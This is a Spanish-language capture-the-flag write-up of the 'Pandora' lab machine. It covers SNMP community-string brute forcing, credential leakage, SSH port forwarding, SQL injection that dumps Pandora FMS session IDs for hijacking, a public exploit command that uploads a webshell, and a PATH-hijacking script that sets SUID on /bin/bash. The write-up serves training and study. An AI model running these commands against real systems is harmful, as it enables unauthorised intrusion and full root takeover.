-----
- Tags: #snmp #information-leakage #local-port-forwarding #sqli #sqlmap #Pandora #rce #path-hijacking #ltrace
------
## Técnicas utilizadas
- SNMP Fast Enumeration  
- Information Leakage  
- Local Port Forwarding  
- SQL Injection - Admin Session Hijacking  
- PandoraFMS v7.0NG Authenticated Remote Code Execution [CVE-2019-20224]  
- Abusing Custom Binary - PATH Hijacking [Privilege Escalation]
## Procedimiento
![[Pasted image 20230711101914.png]]

--------------
#### Reconocimiento
Si lanzamos un **nmap** podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80 10.10.11.136 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 10:32 MST
Nmap scan report for 10.10.11.136
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
```

Un escaneo con **whatweb** sobre las tecnologías que estan corriendo por detrás de la pagina web nos muestra lo siguiente:
```ruby
# whatweb 10.10.11.136
http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```

Aplicando un reconocimiento de subdominios y directorios sobre la pagina web no logramos encontrar nada relevante, podemos pasar aplicar un escaneo con nmap sobre puertos **UDP** y vemos que esta abierto **snmp**:
![[Pasted image 20230711104850.png]]

-----------
#### SNMP Fast Enumeration
Hay herramientas que nos ayudan a enumerar el servicio **snmp**, por un lado tenemos **snmpbulkwalk** ( apt install snmpbulkwalk ) y por otro **snmpwalk** ( apt install snmpwalk ). Pero antes de poder enumerar el servicio, debemos conocer la **Community String**, podemos usar herramientas como **onesixtyone** para aplicar fuerza bruta y dar con la **Community String** correcta:
```ruby
# onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 10.10.11.136
```

Y encontramos que la **Community String** correcta en este caso es **public**:
```ruby
# onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 10.10.11.136
Scanning 1 hosts, 123 communities
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
```

Ahora que conocemos la **Community String** podemos comenzar enumerar el servicio, podemos usar **snmpbulkwalk**, que esta tiene una velocidad mucho más considerable que **snmpwalk**:
```
snmpbulkwalk -c public -v2c 10.10.11.136
```

----------
#### Information Leakage  
Esto nos lanzara muchisima información, podemos inspeccionar un poco y mirar si hay algo que nos llame la atención. Encontramos unas credenciales que de primero parecen autenticarse contra un script:
![[Pasted image 20230711110932.png]]

Estas mismas credenciales son utilizadas para conectarnos por **SSH**.

-------------
#### Local Port Forwarding 
Si le hechamos un ojo al script contra el que se esta autenticando, podemos observar que lo hace contra un servicio web, especificamente **PandoraFMS** que por alguna razón nosotros no podiamos verlo desde fuera. Ya que estamos desde **SSH**, podemos hacer un **Local Port Forwarding** del puerto **80** para poder verlo desde nuestra maquina:
![[Pasted image 20230711113119.png]]

--------
#### SQL Injection - Admin Session Hijacking  
Buscando por **Google**  sobre la versión actualmente en uso, encontramos que tiene un par de [vulnerabilidades](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/). Hay una especialmente que nos pude ayudar a robar la sesión de los usuarios y es que en la base de datos se suelen almacenar las sesiones de los usuarios y esta version es vulnerable a SQLi. Echando un ojo encotramos las siguientes sesiones:
```
+-----------------------------------------------------+----------------------------+-------------+
| data                                                | id_session                 | last_active |
+-----------------------------------------------------+----------------------------+-------------+
| id_usuario|s:6:"daniel";                            | 09vao3q1dikuoi1vhcvhcjjbc6 | 1638783555  |
| NULL                                                | 0ahul7feb1l9db7ffp8d25sjba | 1638789018  |
| NULL                                                | 1fm25cnd6n92c7169vhmvbaf1c | 1689101923  |
| NULL                                                | 1um23if7s531kqf5da14kf5lvm | 1638792211  |
| NULL                                                | 2e25c62vc3odbppmg6pjbf9bum | 1638786129  |
| id_usuario|s:6:"daniel";                            | 346uqacafar8pipuppubqet7ut | 1638540332  |
| NULL                                                | 3koutb9nbo2ehokr19svd74kk4 | 1689101260  |
| NULL                                                | 3me2jjab4atfa5f8106iklh4fc | 1638795380  |
| NULL                                                | 4562pucm64jf8bmhtg2rk6m5sc | 1689102363  |
| NULL                                                | 4f51mju7kcuonuqor3876n8o02 | 1638786842  |
| id_usuario|s:6:"daniel";                            | 4nsbidcmgfoh1gilpv8p5hpi2s | 1638535373  |
| NULL                                                | 59qae699l0971h13qmbpqahlls | 1638787305  |
| NULL                                                | 5d8etgib61qql52ilmkoqneoft | 1689101985  |
| NULL                                                | 5fihkihbip2jioll1a8mcsmp6j | 1638792685  |
| id_usuario|s:6:"daniel";                            | 5i352tsdh7vlohth30ve4o0air | 1638281946  |
| id_usuario|s:6:"daniel";                            | 69gbnjrc2q42e8aqahb1l2s68n | 1641195617  |
| NULL                                                | 81f3uet7p3esgiq02d4cjj48rc | 1623957150  |
| NULL                                                | 8iva4veglc47578gmfb6q6kaht | 1689101279  |
| id_usuario|s:6:"daniel";                            | 8m2e6h8gmphj79r9pq497vpdre | 1638446321  |
| NULL                                                | 8ptvkiomi9rplbqo9eombuasmg | 1689100558  |
| NULL                                                | 8upeameujo9nhki3ps0fu32cgd | 1638787267  |
| id_usuario|s:6:"daniel";                            | 9vv4godmdam3vsq8pu78b52em9 | 1638881787  |
| NULL                                                | a3a49kc938u7od6e6mlip1ej80 | 1638795315  |
| id_usuario|s:6:"daniel";                            | agfdiriggbt86ep71uvm1jbo3f | 1638881664  |
| NULL                                                | amfkhjkapilltrpp205n7j0qif | 1689102277  |
| NULL                                                | b10mq0t5157qpkqf0cb30jqisg | 1689102551  |
| NULL                                                | bhcvj01chgmht0sulos896nbfb | 1689102070  |
| NULL                                                | cojb6rgubs18ipb35b3f6hf0vp | 1638787213  |
| NULL                                                | d0carbrks2lvmb90ergj7jv6po | 1638786277  |
| NULL                                                | d2g3gutgms72kmm44nfgnpid7i | 1689102327  |
| id_usuario|s:6:"daniel";                            | eai0g7lkoo9ipji7nefbsf6n3a | 1689096996  |
| NULL                                                | ei27pp8nsotpvqnj83v898g25p | 1689101951  |
| id_usuario|s:6:"daniel";                            | f0qisbrojp785v1dmm8cu1vkaj | 1641200284  |
| NULL                                                | fikt9p6i78no7aofn74rr71m85 | 1638786504  |
| NULL                                                | fqd96rcv4ecuqs409n5qsleufi | 1638786762  |
| NULL                                                | fu8jlarnai0s2fml5qmc8e1gm9 | 1689101272  |
| NULL                                                | fut0ff6js5v4s5lfbf1ujtf3gq | 1689101838  |
| NULL                                                | fv4qd48n0vpdel9qrkugucvqa6 | 1689101764  |
| id_usuario|s:6:"daniel";                            | g0kteepqaj1oep6u7msp0u38kv | 1638783230  |
| id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | g4e01qdgk36mfdh90hvcc54umq | 1638796349  |
| NULL                                                | gf40pukfdinc63nm5lkroidde6 | 1638786349  |
| NULL                                                | heasjj8c48ikjlvsf1uhonfesv | 1638540345  |
| NULL                                                | hktd7d20jfi441d0naqhr281pi | 1689101264  |
| id_usuario|s:6:"daniel";                            | hsftvg6j5m3vcmut6ln6ig8b0f | 1638168492  |
| NULL                                                | i6nguu92djdjr1b0gofsnbe79s | 1689100536  |
| id_usuario|s:6:"daniel";                            | j0bb7u9gmk477794j6tbh2sduj | 1689099384  |
| NULL                                                | j8dnsq0kdt4rhd47gnkp61ffp4 | 1689101187  |
| id_usuario|s:6:"daniel";                            | jecd4v8f6mlcgn4634ndfl74rd | 1638456173  |
| NULL                                                | jqvh8m9l5o37badu7tqtcgrkmn | 1689102609  |
| NULL                                                | k7f6cmvt5af566gi8fu31rp7f3 | 1689101678  |
| NULL                                                | kp90bu1mlclbaenaljem590ik3 | 1638787808  |
| NULL                                                | loagb8s3ua911nr5f1e47c0365 | 1689101409  |
| NULL                                                | m4crn7sd2cg06gbn2c4q0k41rq | 1689101424  |
| id_usuario|s:6:"daniel";                            | mcoi3ogmpktpat5868hc7dhe89 | 1689101667  |
| NULL                                                | ne9rt4pkqqd0aqcrr4dacbmaq3 | 1638796348  |
| id_usuario|s:6:"daniel";                            | o3kuq4m5t5mqv01iur63e1di58 | 1638540482  |
| id_usuario|s:6:"daniel";                            | oi2r6rjq9v99qt8q9heu3nulon | 1637667827  |
| id_usuario|s:6:"daniel";                            | pjp312be5p56vke9dnbqmnqeot | 1638168416  |
| NULL                                                | qq8gqbdkn8fks0dv1l9qk6j3q8 | 1638787723  |
| NULL                                                | r097jr6k9s7k166vkvaj17na1u | 1638787677  |
| id_usuario|s:6:"daniel";                            | rgku3s5dj4mbr85tiefv53tdoa | 1638889082  |
| NULL                                                | sjpau4efpjdnlm0kklbpaiqcm0 | 1689099842  |
| id_usuario|s:6:"daniel";                            | u5ktk2bt6ghb7s51lka5qou4r4 | 1638547193  |
| id_usuario|s:6:"daniel";                            | u74bvn6gop4rl21ds325q80j0e | 1638793297  |
| id_usuario|s:5:"admin";                             | v7op9au0bp1ds9gl8m50t6k9v8 | 1689101329  |
| NULL                                                | vf6cporpc8o6vd2ebg3cg2jqut | 1689102059  |
| id_usuario|s:6:"daniel";                            | vmba853t1oub6e4hfddvhjdjg4 | 1689100798  |
+-----------------------------------------------------+----------------------------+-------------+
```

Podemos probar con la del usuario Matt y nos podemos robar su sesión. 

----------
#### PandoraFMS v7.0NG Authenticated Remote Code Execution
Buscando en github por algun exploit disponible, encontramos que existe uno que nos permite subir una webshell, es del repositorio de [UnicorDev](https://github.com/UNICORDev/exploit-CVE-2020-5844). Solo tenemos que correr el exploit con los argumentos correctos y se nos subira una web shell.
```
python3 exploit-CVE-2020-5844.py -t 127.0.0.1 80 -p v7op9au0bp1ds9gl8m50t6k9v8
```

---------
#### Abusing Custom Binary - PATH Hijacking [Privilege Escalation]
Si buscamos por archivos SUID encontramos el siguiente:
![[Pasted image 20230711124430.png]]

Si aplicamos un **ltrace** podemos observar que hace uso de **tar** sin definia la ruta completa del binario, esto puede conducir a un **PATH Hijacking**:
![[Pasted image 20230711124605.png]]

Podemos crear un archivo con nombre **tar** en alguna ruta donde dispongamos privilegios de escritorios que contenga lo siguiente:
```bash
#!/bin/bash
chmod u+s /bin/bash
```

Ahora solo queda modificar el **Path** para que este revise primero esta ruta cuando busque el binario de **tar**:
```
export PATH=/tmp:$PATH
```

Ejecutamos el binario y posteriormente hacemos un **bash -p**.

